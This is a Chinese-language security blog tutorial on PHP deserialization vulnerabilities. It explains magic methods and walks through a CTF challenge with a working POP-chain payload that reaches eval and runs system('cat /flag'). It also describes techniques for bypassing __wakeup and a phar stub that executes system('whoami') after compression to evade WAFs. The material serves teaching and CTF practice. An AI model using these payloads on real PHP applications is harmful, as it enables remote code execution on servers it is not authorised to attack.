---
title: "php反序列化漏洞总结"
description: "PHP 反序列化漏洞总结，梳理魔术方法、POP 链构造和常见利用条件。"
pubDate: "2025-12-09"
updatedDate: "2025-12-09"
tags: ["PHP", "反序列化", "Web安全"]
cover: auto
coverAlt: "php反序列化漏洞总结 的文章封面"
draft: false
---
# PHP反序列化漏洞利用

## 什么是序列化和反序列化（参考[什么是序列化和反序列化](https://blog.csdn.net/m0_53518956/article/details/147578420)）

序列化是将对象的状态转换为可存储或可传输格式的过程。

对象在内存中一般以特定的数据结构（指针、引用、哈希表、链表等）存在，直接传输内存数据是不可靠的（不同机器架构不同、数据对齐不同、指针无意义等问题）。

所以我们需要将对象转换成连续的字节流（或标准格式的文本），使得：

    可以写入磁盘文件

    可以通过网络发送到远端

    可以被其他进程或设备正确解析

反序列化就是序列化的逆过程。

把收到的字节流或文本格式数据，还原成内存中的对象或数据结构，供程序继续操作。

比如：

    从磁盘读取一段JSON数据

    解析网络收到的一段Protobuf消息

    把Redis里缓存的对象取出来恢复成原始对象

总而言之就是将一个对象转换为计算机可以传输识别且不易损毁的形式，然后再通过反序列化将其变回对象

## 什么是php反序列化

这里我们要知道什么是类和对象，这里与python中的类和对象大致相同

然后就是serialize和unserialize这两个函数

然后就是魔术方法和利用链，了解完这些我们就可以完成php反序列化了

### 魔术方法

常见的魔术方法有以下几种

```
__construct
构造函数，在实例化一个对象的时候，首先会去自动触发（执行）的一个方法
上面已经见识过了
__destruct()   
析构函数，在对象的所有引用被删除或者当对象被显示销毁时执行的魔术方法
学一下 php 的 gc 回收机制
触发时机：
1、实例化对象结束后触发  如$test=new User();
2、在反序列化之后立马会触发（序列化不会触发）
class CC {
    public $user;
    private $pwd;

    //这是个魔术方法，在创建实例时会自动调用，从而为属性赋值
    public function __construct($user, $pwd)
    {
        $this->user = $user;
        $this->pwd = $pwd;
    }
    public function __destruct(){
        echo "destruct魔术方法被触发了";
    }
}
$cc = new CC('admin', 'password');
$s=serialize($cc);
var_dump(unserialize($s));
__sleep()     
序列化serialize()函数会检查类中是否存在一个魔术方法__sleep。如果存在，该方法会先被调用，然后才执行序列化操作
class CC {
    public $user;
    private $pwd;

    //这是个魔术方法，在创建实例时会自动调用，从而为属性赋值
    public function __construct($user, $pwd)
    {
        $this->user = $user;
        $this->pwd = $pwd;
    }
    public function __sleep(){
        echo "sleep魔术方法被触发了";
    }
}
$cc = new CC('admin', 'password');
$s=serialize($cc);
__wakeup()   
unserialize()会检查是否存在一个__wakeup()  方法，如果存在，则==会先调用==__wakeup()  方法，预先准备对象需要的资源
触发时机：反序列化unserialize()之前  
__wakeup()    反序列化之前触发
__destruct()反序列化之后触发
__toString()  
表达方式错误导致魔术方法触发
触发时机：把对象当成字符串使用
class CC {
    public $user;
    private $pwd;

    //这是个魔术方法，在创建实例时会自动调用，从而为属性赋值
    public function __construct($user, $pwd)
    {
        $this->user = $user;
        $this->pwd = $pwd;
    }
    public function __toString(){
        echo "toString魔术方法被触发了";
    }
}
$cc = new CC('admin', 'password');
echo $cc;
额外提一下__tostring的具体触发场景：
(1) echo $obj / print $obj 打印时会触发
(2) 对象与字符串连接时 $$b="str".$$obj;
(3) 对象参与格式化字符串时 printf( " %s and %d ", $cc, 10 );
(4)=对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）
(5) 对象参与格式化SQL语句，绑定参数时
(6)对象在经过php字符串函数，如 strlen()、addslashes()、die()时
(7) 在in_array()方法中，第一个参数是对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用
(8) 对象作为 class_exists() 的参数的时候
__invoke()  
格式表达错误导致魔术方法触发
是对象被当做函数进行调用时就会触发
class CC {
    public $user;
    private $pwd;

    //这是个魔术方法，在创建实例时会自动调用，从而为属性赋值
    public function __construct($user, $pwd)
    {
        $this->user = $user;
        $this->pwd = $pwd;
    }
    public function __invoke(){
        echo "invoke魔术方法被触发了";
    }
}
$cc = new CC('admin', 'password');
$cc();
__call()
触发时机：调用一个不存在的方法
这个魔术方法需要两个参数
$arg1 调用的不存在的方法的名称 
$arg2 调用的不存在的方法的参数  
class CC {
    public $user;
    private $pwd;

    //这是个魔术方法，在创建实例时会自动调用，从而为属性赋值
    public function __construct($user, $pwd)
    {
        $this->user = $user;
        $this->pwd = $pwd;
    }
    public function __call($name,$args){
        echo "call魔术方法被触发了，函数名为".$name."，参数为".$args[0];
    }
}
$cc = new CC('admin', 'password');
$cc->abc();

__get()
触发时机：调用的成员属性不存在
参数：传参$arg1
返回值：不存在的成员属性的名称
<?php
class CC {
    public $user;
    private $pwd;

    //这是个魔术方法，在创建实例时会自动调用，从而为属性赋值
    public function __construct($user, $pwd)
    {
        $this->user = $user;
        $this->pwd = $pwd;
    }
    public function __get($args){
        echo "__get魔术方法被触发了，不存在".$args."属性";
    }
}
$cc = new CC('admin', 'password');
$cc->a;
?>
__set()
触发时机：给不存在的成员属性赋值
参数：2个参数$arg1,$arg2
返回值：不存在的成员属性的名称和赋的值
<?php
class CC {
    public $user;
    private $pwd;

    //这是个魔术方法，在创建实例时会自动调用，从而为属性赋值
    public function __construct($user, $pwd)
    {
        $this->user = $user;
        $this->pwd = $pwd;
    }

    public function __set($arg1,$arg2){
        echo "__set魔术方法被触发了，不存在".$arg1."属性";
    }
}
$cc = new CC('admin', 'password');
$cc->a=1;
?>
__isset()
触发时机：对不可访问成员属性或者不存在的成员属性 使用函数isset()或者empty()时，__isset()会被调用
这个魔术方法需要一个参数，接受到该属性
<?php
class CC {
    public $user;
    private $pwd;

    //这是个魔术方法，在创建实例时会自动调用，从而为属性赋值
    public function __construct($user, $pwd)
    {
        $this->user = $user;
        $this->pwd = $pwd;
    }

    public function __isset($arg){
        echo "__isset魔术方法被触发了".$arg;
    }
}
$cc = new CC('admin', 'password');
isset($cc->pwd);
?>
__unset()
触发时机：对不可访问成员属性或者不存在的成员属性 使用函数unset()时，__unset()会被调用
这个魔术方法需要一个参数，接受到该属性
<?php
class CC {
    public $user;
    private $pwd;

    //这是个魔术方法，在创建实例时会自动调用，从而为属性赋值
    public function __construct($user, $pwd)
    {
        $this->user = $user;
        $this->pwd = $pwd;
    }

    public function __unset($arg){
        echo "__unset魔术方法被触发了".$arg;
    }
}
$cc = new CC('admin', 'password');
unset($cc->pwd);
?>
__clone
触发时机：当使用clone关键字完成拷贝一个对象后，新对象会自动调用定义的魔术方法__clone()
<?php
class CC {
    public $user;
    private $pwd;

    //这是个魔术方法，在创建实例时会自动调用，从而为属性赋值
    public function __construct($user, $pwd)
    {
        $this->user = $user;
        $this->pwd = $pwd;
    }

    public function __clone(){
        echo "__clone魔术方法被触发了";
    }
}
$cc = new CC('admin', 'password');
clone($cc);
?>

注意点：
魔术方法触发前提：魔术方法所在类（或者对象）被调用，对某个对象进行反序列化，只会触发该对象里对应的魔术方法，不会触发其它对象里的方法
```

对于魔术方法你需要知道常用的几种怎么用如何利用代码逻辑即可，不常用的可以现场学一下

然后就是利用魔术方法来找pop链，这个可以找一道试题写一下，远比干讲来的清晰，找一道最简单的，理解一下pop链的原理

以下是一道试题的示例

?CTF2025 新生赛
```
 <?php
highlight_file(__FILE__);
error_reporting(0);
class Wuhuarou{
    public $Wuhuarou;
    function __wakeup(){
        echo "Nice Wuhuarou!</br>";
        echo $this -> Wuhuarou;
    }
}
class Fentiao{
    public $Fentiao;
    public $Hongshufentiao;
    public function __toString(){
        echo "Nice Fentiao!</br>";
        return $this -> Fentiao -> Hongshufentiao;
    }
}
class Baicai{
    public $Baicai;
    public function __get($key){
        echo "Nice Baicai!</br>";
        $Baicai = $this -> Baicai;
        return $Baicai();
    }
}
class Wanzi{
    public $Wanzi;
    public function __invoke(){
        echo "Nice Wanzi!</br>";
        return $this -> Wanzi -> Xianggu();
    }
}
class Xianggu{
    public $Xianggu;
    public $Jinzhengu;
    public function __construct($Jinzhengu){
        $this -> Jinzhengu = $Jinzhengu;
    }
    public function __call($name, $arg){
        echo "Nice Xianggu!</br>";
        $this -> Xianggu -> Bailuobo = $this -> Jinzhengu;
    }
}
class Huluobo{
    public $HuLuoBo;
    public function __set($key,$arg){
        echo "Nice Huluobo!</br>";
        eval($arg);
    }
}

if (isset($_POST['eat'])){
    unserialize($_POST['eat']);
} 
```

这道题存粹考察了对魔术方法的利用，没有涉及什么绕过比较简单，下附payload，可以和上文中的魔术方法一个个对照来学习

payload
```
<?php 
class Wuhuarou{
    public $Wuhuarou;
}
class Fentiao{
    public $Fentiao;
    public $Hongshufentiao;
  
}
class Baicai{
    public $Baicai;
  
}
class Wanzi{
    public $Wanzi;
  
}
class Xianggu{
    public $Xianggu;
    public $Jinzhengu;

    public function __construct($Jinzhengu){
        $this -> Jinzhengu = $Jinzhengu; 
    }
  
}
class Huluobo{
    public $HuLuoBo;
  
}
$cmd = "system('cat /flag');";
$huluobo = new Huluobo;
$xianggu = new Xianggu($cmd);
$xianggu -> Xianggu = $huluobo ;
$wanzi = new Wanzi;
$wanzi -> Wanzi = $xianggu;
$baicai = new Baicai;
$baicai -> Baicai = $wanzi;
$fentiao = new Fentiao;
$fentiao -> Fentiao = $baicai;
$wuhuarou = new Wuhuarou;
$wuhuarou -> Wuhuarou = $fentiao;

echo urlencode(serialize($wuhuarou));

?>
```

### waf(参考至[https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/](https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/))

然后我们来讲一下waf

首先最常见的就是关于wakeup魔术方法的waf，应为wakeup在反序列化前触发也就是最早触发，如果在wakeup处便被拦了会导致后续的pop链无法生效

常见的绕过方式有，

1.cve-2016-7124

这个适用于
影响范围：

    PHP5 < 5.6.25
    PHP7 < 7.0.10

简而言之当我们的对象属性个数大于实际属性个数时会会先绕过wakeup

如将O:4:"xctf":1:{s:4:"flag";s:3:"111";}变成O:4:"xctf":2:{s:4:"flag";s:3:"111";}，这样使属性个数多了一个实现绕过

2.php引用赋值&

比如使$b=&$a，让两个变量指向同一块地址，这样对其中一个赋值时就可以将另一个变量一起赋值

以下是一个示例

```
<?php

class KeyPort{
    public $key;

    public function __destruct()
    {
        $this->key=False;
        if(!isset($this->wakeup)||!$this->wakeup){
            echo "You get it!";
        }
    }

    public function __wakeup(){
        $this->wakeup=True;
    }

}

if(isset($_POST['pop'])){

    @unserialize($_POST['pop']);

}
```

我们不能发现这道题的难点就是wakeup的绕过，所以我们就可以通过将$KeyPort->key=&$KeyPort->wakeup来实现赋值为False

3.fast-destruct

引用一下大佬的解释：

    在PHP中如果单独执行unserialize()函数，则反序列化后得到的生命周期仅限于这个函数执行的生命周期，在执行完unserialize()函数时就会执行__destruct()方法
    而如果将unserialize()函数执行后得到的字符串赋值给了一个变量，则反序列化的对象的生命周期就会变长，会一直到对象被销毁才执行析构方法

一种方式就是修改序列化字符串的结构，使得完成部分反序列化的unserialize强制退出，提前触发__destruct

总而言之我们需要提前销毁实现destruct，具体操作可以删除一个}或者时在末尾加一个i，不过要看具体情况而定，可以去了解一下

4.php issue#9618


    7.4.x -7.4.30
    8.0.x
php issue#9618提到了最新版wakeup()的一种bug，可以通过在反序列化后的字符串中包含字符串长度错误的变量名使反序列化在__wakeup之前调用__destruct()函数，最后绕过__wakeup()

当destruct和wakeup位于不同类的时候，通过私有属性的不可见字符，使传入的字符长度和实际被不可见字包含的不相等来绕过

5.使用C绕过

可以将php反序列化pop链用arrayobject打包然后绕过wakeup

## phar反序列化

phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展php反序列化漏洞的攻击面

所以我们可以通过对metadata的利用实现phar反序列化

以下是一个简单的phar文件生成

```
<?php
    class TestObject {
    }
    $phar = new Phar("phar.phar");
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>");
    $o = new TestObject();
    $phar->setMetadata($o);
    $phar->addFromString("test.txt", "test");
    $phar->stopBuffering();
?>
```

一般phar反序列化的操作是，结合文件上传以及phar://伪协议，来实现对metadata的利用

受影响的函数有include，file_exists，fopen，file_get_contents等

## phar的高级玩法（rce）

如果碰到严格waf让我们对metadata的利用没有办法实现该怎么办呢

那么我们可以通过include和phar结合的一个高级用法，利用Stub执行php代码，具体参考[当include邂逅phar](https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/)

因为压缩会使关键字消失，但是php对一些压缩格式会当做phar的合法文件容器进行解压

比如我们用如下payload生成一个phar文件

```
<?php
$phar = new Phar('exploit.phar');
$phar->startBuffering();

$stub = <<<'STUB'
<?php
    system('whoami');
    __HALT_COMPILER();
?>
STUB;

$phar->setStub($stub);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();

?>
```

然后再进行一层gz压缩打包我们可以实现对需求压缩包形式且严格waf的情况rce，利用了stub的执行php代码的原理


